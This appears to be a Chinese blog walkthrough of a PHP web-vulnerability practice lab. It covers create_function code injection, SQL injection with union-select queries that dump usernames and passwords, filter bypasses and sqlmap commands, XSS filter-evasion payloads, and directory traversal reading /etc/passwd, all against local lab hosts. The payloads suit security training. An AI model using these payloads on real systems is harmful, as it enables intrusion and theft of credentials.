-<h4 id="语法：-9"><a href="#语法：-9" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">addslashes(string)</div></pre></td></tr></table></figure>
-<h4 id="参数说明：-8"><a href="#参数说明：-8" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
-<thead>
-<tr>
-<th>参数</th>
-<th style="text-align:center">描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>string</td>
-<td style="text-align:center">必需。规定要转义的字符串。</td>
-</tr>
-</tbody>
-</table>
-<h3 id="create-function-代码注入"><a href="#create-function-代码注入" class="headerlink" title="create_function()代码注入"></a>create_function()代码注入</h3><h4 id="测试环境版本："><a href="#测试环境版本：" class="headerlink" title="测试环境版本："></a>测试环境版本：</h4><p>apache +php 5.2、apache +php 5.3</p>
-<h4 id="有问题的代码："><a href="#有问题的代码：" class="headerlink" title="有问题的代码："></a>有问题的代码：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">//02-8.php?id=2;&#125;phpinfo();/*</div><div class="line">$id=$_GET[&apos;id&apos;];</div><div class="line">$str2=&apos;echo  &apos;.$a.&apos;test&apos;.$id.&quot;;&quot;;</div><div class="line">echo $str2;</div><div class="line">echo &quot;&lt;br/&gt;&quot;;</div><div class="line">echo &quot;==============================&quot;;</div><div class="line">echo &quot;&lt;br/&gt;&quot;;</div><div class="line">$f1 = create_function(&apos;$a&apos;,$str2);</div><div class="line">echo &quot;&lt;br/&gt;&quot;;</div><div class="line">echo &quot;==============================&quot;;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
-<h4 id="利用方法："><a href="#利用方法：" class="headerlink" title="利用方法："></a>利用方法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/libtest/02-8.php?id=2;&#125;phpinfo();/*</div></pre></td></tr></table></figure>
-<h4 id="实现原理："><a href="#实现原理：" class="headerlink" title="实现原理："></a>实现原理：</h4><p>由于id=2;}phpinfo();/*<br>执行函数为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">源代码：</div><div class="line">function fT($a) &#123;</div><div class="line">  echo &quot;test&quot;.$a;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">注入后代码：</div><div class="line">function fT($a) &#123;</div><div class="line">  echo &quot;test&quot;;&#125;</div><div class="line">  phpinfo();/*;//此处为注入代码。</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h3 id="trim"><a href="#trim" class="headerlink" title="trim()"></a>trim()</h3><p>trim() 函数移除字符串两侧的空白字符或其他预定义字符。</p>
-<h4 id="相关函数："><a href="#相关函数：" class="headerlink" title="相关函数："></a>相关函数：</h4><p>ltrim() - 移除字符串左侧的空白字符或其他预定义字符<br>rtrim() - 移除字符串右侧的空白字符或其他预定义字符</p>
-<h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">trim(string,charlist)</div></pre></td></tr></table></figure>
-<h4 id="参数说明：-9"><a href="#参数说明：-9" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
-<thead>
-<tr>
-<th>参数</th>
-<th style="text-align:center">描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>string</td>
-<td style="text-align:center">必需。规定要检查的字符串。</td>
-</tr>
-<tr>
-<td>charlist</td>
-<td style="text-align:center">可选。规定从字符串中删除哪些字符。如果被省略，则移除以下所有字符： “\0” - NULL “\t” - 制表符 “\n” - 换行 “\x0B” - 垂直制表符 “\r” - 回车 “ “ - 空格</td>
-</tr>
-</tbody>
-</table>
-<h3 id="htmlentities"><a href="#htmlentities" class="headerlink" title="htmlentities()"></a>htmlentities()</h3><p>htmlentities() 函数把字符转换为 HTML 实体。</p>
-<h4 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">htmlentities(string,flags,character-set,double_encode)</div></pre></td></tr></table></figure>
-<h4 id="参数说明：-10"><a href="#参数说明：-10" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
-<thead>
-<tr>
-<th>参数</th>
-<th style="text-align:center">描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>string</td>
-<td style="text-align:center">必需。规定要转换的字符串。</td>
-</tr>
-<tr>
-<td>flags</td>
-<td style="text-align:center">可选。规定如何处理引号、无效的编码以及使用哪种文档类型。</td>
-</tr>
-<tr>
-<td>character-set</td>
-<td style="text-align:center">可选。一个规定了要使用的字符集的字符串。</td>
-</tr>
-<tr>
-<td>double_encode</td>
-<td style="text-align:center">可选。布尔值，规定是否编码已存在的 HTML 实体。 TRUE - 默认。将对每个实体进行转换。FALSE - 不会对已存在的 HTML 实体进行编码。</td>
-</tr>
-</tbody>
-</table>
-<h3 id="header"><a href="#header" class="headerlink" title="header()"></a>header()</h3><p>header() 函数向客户端发送原始的 HTTP 报头。</p>
-<h4 id="语法：-10"><a href="#语法：-10" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">header(string,replace,http_response_code)</div></pre></td></tr></table></figure>
-<h4 id="参数说明：-11"><a href="#参数说明：-11" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
-<thead>
-<tr>
-<th>参数</th>
-<th style="text-align:center">描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>string</td>
-<td style="text-align:center">必需。规定要发送的报头字符串。</td>
-</tr>
-<tr>
-<td>replace</td>
-<td style="text-align:center">可选。指示该报头是否替换之前的报头，或添加第二个报头。默认是 true（替换）。false（允许相同类型的多个报头）。</td>
-</tr>
-<tr>
-<td>http_response_code</td>
-<td style="text-align:center">可选。把 HTTP 响应代码强制为指定的值。（PHP 4 以及更高版本可用）</td>
-</tr>
-</tbody>
-</table>
-<h2 id="SQL-injections"><a href="#SQL-injections" class="headerlink" title="SQL injections"></a>SQL injections</h2><h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1"></a>Example 1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$sql = &quot;SELECT * FROM users where name=&apos;&quot;; $sql .= $_GET[&quot;name&quot;].&quot;&apos;&quot;; $result = mysql_query($sql); if ($result) &#123; ?&gt;</div></pre></td></tr></table></figure>
-<p>字符类型的注入，无过滤<br>用来练习手注是个不错的题目</p>
-<h4 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; 页面返回异常</div><div class="line"></div><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; and 1=1%23 页面返回正常</div><div class="line"></div><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; and 1=2%23 页面返回正常</div></pre></td></tr></table></figure>
-<h4 id="判断字段长"><a href="#判断字段长" class="headerlink" title="判断字段长"></a>判断字段长</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; order by 5%23 页面返回正常</div><div class="line"></div><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; order by 6%23 页面返回异常</div></pre></td></tr></table></figure>
-<p>推断出这个表中有5个字段</p>
-<h4 id="猜解当前数据库名；"><a href="#猜解当前数据库名；" class="headerlink" title="猜解当前数据库名；"></a>猜解当前数据库名；</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,database(),3,4,5%23</div></pre></td></tr></table></figure>
-<h4 id="猜解所有的数据库"><a href="#猜解所有的数据库" class="headerlink" title="猜解所有的数据库"></a>猜解所有的数据库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,SCHEMA_NAME,3,4,5 from information_schema.SCHEMATA%23</div></pre></td></tr></table></figure>
-<h4 id="猜解所有的表名"><a href="#猜解所有的表名" class="headerlink" title="猜解所有的表名"></a>猜解所有的表名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,table_name,3,4,5 from information_schema.tables%23</div></pre></td></tr></table></figure>
-<h4 id="猜解当前数据库（exercises）的所以表名"><a href="#猜解当前数据库（exercises）的所以表名" class="headerlink" title="猜解当前数据库（exercises）的所以表名"></a>猜解当前数据库（exercises）的所以表名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,table_name,3,4,5 from information_schema.tables where table_schema= database()%23</div></pre></td></tr></table></figure>
-<h4 id="猜解当前数据库的user的字段名"><a href="#猜解当前数据库的user的字段名" class="headerlink" title="猜解当前数据库的user的字段名"></a>猜解当前数据库的user的字段名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,COLUMN_NAME,2,4,5 from information_schema.COLUMNS where table_name = &apos;users&apos;%23</div></pre></td></tr></table></figure>
-<h4 id="判断版本号"><a href="#判断版本号" class="headerlink" title="判断版本号"></a>判断版本号</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,version(),2,4,5%23</div></pre></td></tr></table></figure>
-<h4 id="判断用户名"><a href="#判断用户名" class="headerlink" title="判断用户名"></a>判断用户名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,user(),2,4,5%23  </div><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,current_user(),2,4,5%23</div><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,system_user(),2,4,5%23</div><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,session_user(),2,4,5%23</div></pre></td></tr></table></figure>
-<h4 id="读取值"><a href="#读取值" class="headerlink" title="读取值"></a>读取值</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,name,passwd,4,5 from users%23</div></pre></td></tr></table></figure>
-<h4 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -u http://192.168.1.105/sqli/example1.php?name=root --dbs</div></pre></td></tr></table></figure>
-<h3 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2"></a>Example 2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if (preg_match(&apos;/ /&apos;, $_GET[&quot;name&quot;])) &#123; die(&quot;ERROR NO SPACE&quot;); &#125; $sql = &quot;SELECT * FROM users where name=&apos;&quot;; $sql .= $_GET[&quot;name&quot;].&quot;&apos;&quot;; $result = mysql_query($sql);</div></pre></td></tr></table></figure>
-<p>与example1差不多，过滤了空格，语句中存现空格就会报错</p>
-<p>mysql注入绕过空格过滤的方法：</p>
-<p>1、水平制表(HT) url编码：%09</p>
-<p>2、注释绕过空格   /<em>注释</em>/</p>
-<h4 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example2.php?name=root&apos;%09union%09select%091,name,passwd,4,5%09from%09users%23  %09替换空格绕过</div><div class="line"></div><div class="line">http://192.168.1.105/sqli/example2.php?name=root&apos;/**/union/**/select/**/1,name,passwd,4,5/**/from/**/users%23  /**/替换空格绕过</div></pre></td></tr></table></figure>
-<h4 id="SQLMAP-1"><a href="#SQLMAP-1" class="headerlink" title="SQLMAP"></a>SQLMAP</h4><p>调用space2comment.py<br>用“/**/”替换空格符绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -u http://192.168.1.105/sqli/example3.php?name=root --dbs --tamper=space2comment.py</div></pre></td></tr></table></figure></p>
-<h3 id="Example-3"><a href="#Example-3" class="headerlink" title="Example 3"></a>Example 3</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if (preg_match(&apos;/\s+/&apos;, $_GET[&quot;name&quot;])) &#123; die(&quot;ERROR NO SPACE&quot;); &#125; $sql = &quot;SELECT * FROM users where name=&apos;&quot;; $sql .= $_GET[&quot;name&quot;].&quot;&apos;&quot;;</div></pre></td></tr></table></figure>
-<p>在example2的基础上，\s匹配任何空白字符,包括空格、制表符、换页符等，全部过滤掉<br>可以使用example2中 /<em>注释</em>/ 绕过过滤</p>
-<h4 id="Payload-1"><a href="#Payload-1" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example2.php?name=root&apos;/**/union/**/select/**/1,name,passwd,4,5/**/from/**/users%23</div></pre></td></tr></table></figure>
-<h4 id="SQLMAP-2"><a href="#SQLMAP-2" class="headerlink" title="SQLMAP"></a>SQLMAP</h4><p>调用space2comment.py<br>用“/**/”替换空格符绕过</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -u http://192.168.1.105/sqli/example3.php?name=root --dbs --tamper=space2comment.py</div></pre></td></tr></table></figure>
-<h3 id="Example-4"><a href="#Example-4" class="headerlink" title="Example 4"></a>Example 4</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$sql=&quot;SELECT * FROM users where id=&quot;; $sql.=mysql_real_escape_string($_GET[&quot;id&quot;]).&quot; &quot;; $result = mysql_query($sql);</div></pre></td></tr></table></figure>
-<p>数值型的注入，过滤了单引号等，对数值型无效</p>
-<h4 id="Payload-2"><a href="#Payload-2" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example4.php?id=2 or 1=1</div><div class="line">http://192.168.1.105/sqli/example4.php?id=2 union select 1,name, passwd,4,5 from users</div></pre></td></tr></table></figure>
-<h4 id="SQLMAP-3"><a href="#SQLMAP-3" class="headerlink" title="SQLMAP"></a>SQLMAP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -u http://192.168.1.105/sqli/example4.php?id=2 --dbs</div></pre></td></tr></table></figure>
-<h3 id="Example-5"><a href="#Example-5" class="headerlink" title="Example 5"></a>Example 5</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if (!preg_match(&apos;/^[0-9]+/&apos;, $_GET[&quot;id&quot;])) &#123; die(&quot;ERROR INTEGER REQUIRED&quot;); &#125;</div></pre></td></tr></table></figure>
-<p>与前面类似，以一个数字开头的，后面可添加构造的sql语句进行攻击测试</p>
-<h4 id="Payload-3"><a href="#Payload-3" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example4.php?id=2 or 1=1</div><div class="line">http://192.168.1.105/sqli/example4.php?id=2 union select 1,name, passwd,4,5 from users</div></pre></td></tr></table></figure>
-<h4 id="SQLMAP-4"><a href="#SQLMAP-4" class="headerlink" title="SQLMAP"></a>SQLMAP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -u http://192.168.1.105/sqli/example5.php?id=2 --dbs</div></pre></td></tr></table></figure>
-<h3 id="Example-6"><a href="#Example-6" class="headerlink" title="Example 6"></a>Example 6</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if (!preg_match(&apos;/[0-9]+$/&apos;, $_GET[&quot;id&quot;])) &#123; die(&quot;ERROR INTEGER REQUIRED&quot;); &#125;</div></pre></td></tr></table></figure>
-<p>正则表达式值确保了参数id是以一个数字结尾的.他不能确保id参数的开头是合法的.</p>
-<p>你可以变通一下前面说到的检测方法.你只需要在你的payload后面加上数字.比如你可以这样:1 or 1=1 # 123</p>
-<h4 id="Payload-4"><a href="#Payload-4" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example6.php?id=2 or 1=1-- - 1</div><div class="line">http://192.168.1.105/sqli/example6.php?id=2 or 1=1# 1</div><div class="line">http://192.168.1.105/sqli/example6.php?id=2 union select 1,name,passwd,4,5 from users-- - 123</div></pre></td></tr></table></figure>
-<h4 id="SQLMAP-5"><a href="#SQLMAP-5" class="headerlink" title="SQLMAP"></a>SQLMAP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -u http://192.168.1.105/sqli/example6.php?id=2 --dbs</div></pre></td></tr></table></figure>
-<h3 id="Example-7"><a href="#Example-7" class="headerlink" title="Example 7"></a>Example 7</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if (!preg_match(&apos;/^-?[0-9]+$/m&apos;, $_GET[&quot;id&quot;])) &#123; die(&quot;ERROR INTEGER REQUIRED&quot;); &#125;</div></pre></td></tr></table></figure>
-<p>正则表达式将检查开始和结束的字符串是一个数字。然而，正则表达式中有一个修饰符/m。它只检查一行，不关心下一行有开始还是结束用数字。所以我们可以绕过它采用id =2\npayload。我们需要把\n转换成十六进制。就是%a0</p>
-<h4 id="Payload-5"><a href="#Payload-5" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.110/sqli/example7.php?id=2%0aunion%0aselect%0a1,name,passwd,4,5%0afrom%0ausers%23</div></pre></td></tr></table></figure>
-<h4 id="SQLMAP-6"><a href="#SQLMAP-6" class="headerlink" title="SQLMAP"></a>SQLMAP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -u http://192.168.1.110/sqli/example7.php?id=2%0a</div></pre></td></tr></table></figure>
-<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="Example-1-1"><a href="#Example-1-1" class="headerlink" title="Example 1"></a>Example 1</h3><p>没有做任何过滤</p>
-<h4 id="Payload-6"><a href="#Payload-6" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(1)&lt;/script&gt;</div></pre></td></tr></table></figure>
-<h3 id="Example-2-1"><a href="#Example-2-1" class="headerlink" title="Example 2"></a>Example 2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">preg_replace(&quot;/&lt;script&gt;/&quot;,&quot;&quot;,$name);</div><div class="line">preg_replace(&quot;/&lt;\/script&gt;/&quot;,&quot;&quot;,$name);</div></pre></td></tr></table></figure>
-<p>过滤script标签，利用大写绕过</p>
-<h4 id="Payload-7"><a href="#Payload-7" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure>
-<h3 id="Example-3-1"><a href="#Example-3-1" class="headerlink" title="Example 3"></a>Example 3</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">preg_replace(&quot;/&lt;script&gt;/i&quot;,&quot;&quot;,$name);</div><div class="line">preg_replace(&quot;/&lt;\/script&gt;/i&quot;,&quot;&quot;,$name);</div></pre></td></tr></table></figure>
-<p>过滤script标签，且使用模式修正符i，忽略大小写。</p>
-<h4 id="Payload-8"><a href="#Payload-8" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/sc&lt;/script&gt;ript&gt;</div></pre></td></tr></table></figure>
-<h3 id="Example-4-1"><a href="#Example-4-1" class="headerlink" title="Example 4"></a>Example 4</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">preg_match(&apos;/script/i&apos;,$_GET[&quot;name&quot;])</div></pre></td></tr></table></figure>
-<p>过滤script字符，且使用模式修正符i,忽略大小写。<br>利用img标签</p>
-<h4 id="Payload-9"><a href="#Payload-9" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img src=1 onerror=alert(1)&gt;</div></pre></td></tr></table></figure>
-<h3 id="Example-5-1"><a href="#Example-5-1" class="headerlink" title="Example 5"></a>Example 5</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">preg_match(&apos;/alert/i&apos;,$_GET[&quot;name&quot;]))</div></pre></td></tr></table></figure>
-<p>过滤alert字符，且使用模式修正符i,忽略大小写<br>利用prompt(),confirm(),String.fromCharCode()函数实现弹框</p>
-<h4 id="Payload-10"><a href="#Payload-10" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;prompt(1);&lt;/script&gt;</div><div class="line">&lt;script&gt;confirm(1);&lt;/script&gt;</div><div class="line">&lt;script&gt;eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))&lt;/script&gt;</div></pre></td></tr></table></figure>
-<h3 id="Example-6-1"><a href="#Example-6-1" class="headerlink" title="Example 6"></a>Example 6</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">	var $a=&quot;&lt;?php echo $_GET[&quot;name&quot;];?&gt;;</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
-<p>有源码可以看出，GET方式得到的参数直接发送到javascript代码中，所以在发送Payload的时候不需要添加script标签，只需要发送需要只执行的javascript代码即可。</p>
-<h4 id="Payload-11"><a href="#Payload-11" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;;alert(1);//</div></pre></td></tr></table></figure>
-<p>构成以下代码,实现弹窗<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">	var $a= &quot;hacker&quot;;alert(1);//&quot;;</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
-<h3 id="Example-7-1"><a href="#Example-7-1" class="headerlink" title="Example 7"></a>Example 7</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">	var $a=&apos;&lt;?php echo htmlentities($_GET[&quot;name&quot;]);?&gt;&apos;;</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
-<p>使用htmlentities进行HTML编码，默认编码双引号</p>
-<h4 id="Payload-12"><a href="#Payload-12" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;;alert(1);//</div></pre></td></tr></table></figure>
-<h3 id="Example-8"><a href="#Example-8" class="headerlink" title="Example 8"></a>Example 8</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">if （isset($_POST[&quot;name&quot;]）)&#123;</div><div class="line">	echo &quot;HELLO &quot;.htmlentities($_POST[&quot;name&quot;])</div><div class="line">	&#125;</div><div class="line">?&gt;</div><div class="line">&lt;form action=&quot;&lt;?php echo $_SERVER[&apos;PHP_SELF&apos;]; ?&gt;&quot; method=&quot;POST&quot;&gt;</div></pre></td></tr></table></figure>
-<p>利用$_SERVER[‘PHP_SELF’]获取当前页面地址</p>
-<p>假设该页面地址为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.110/xss/example8.php</div></pre></td></tr></table></figure></p>
-<p>访问该页面，得到的表单 html 代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;form method=&quot;post&quot; action=&quot;/xss/example8.php&quot;&gt;</div></pre></td></tr></table></figure></p>
-<h4 id="Payload-13"><a href="#Payload-13" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</div></pre></td></tr></table></figure>
-<h3 id="Example-9"><a href="#Example-9" class="headerlink" title="Example 9"></a>Example 9</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">	document.write(location.hash.substring(1));</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
-<h4 id="Payload-14"><a href="#Payload-14" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#&lt;script&gt;alert(1)&lt;/script&gt;</div></pre></td></tr></table></figure>
-<h2 id="Directory-traversal"><a href="#Directory-traversal" class="headerlink" title="Directory traversal"></a>Directory traversal</h2><h3 id="Example-1-2"><a href="#Example-1-2" class="headerlink" title="Example 1"></a>Example 1</h3><p>简单目录遍历</p>
-<h4 id="Payload-15"><a href="#Payload-15" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.10/dirtrav/example1.php?file=../../../../../../../etc/passwd</div></pre></td></tr></table></figure>
-<h3 id="Example-2-2"><a href="#Example-2-2" class="headerlink" title="Example 2"></a>Example 2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">if(!(strstr($file,&quot;/var/www/files/&quot;)))</div><div class="line">	die();</div></pre></td></tr></table></figure>
-<p>检测是否包含/var/www/files/字符串</p>
-<h4 id="Payload-16"><a href="#Payload-16" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.110/dirtrav/example2.php?file=/var/www/files/../../../../../../../etc/passwd</div></pre></td></tr></table></figure>
-<h3 id="Example-3-2"><a href="#Example-3-2" class="headerlink" title="Example 3"></a>Example 3</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$path = preg_replace(&apos;/\x00.*/&apos;,&quot;&quot;,$path);</div></pre></td></tr></table></figure>
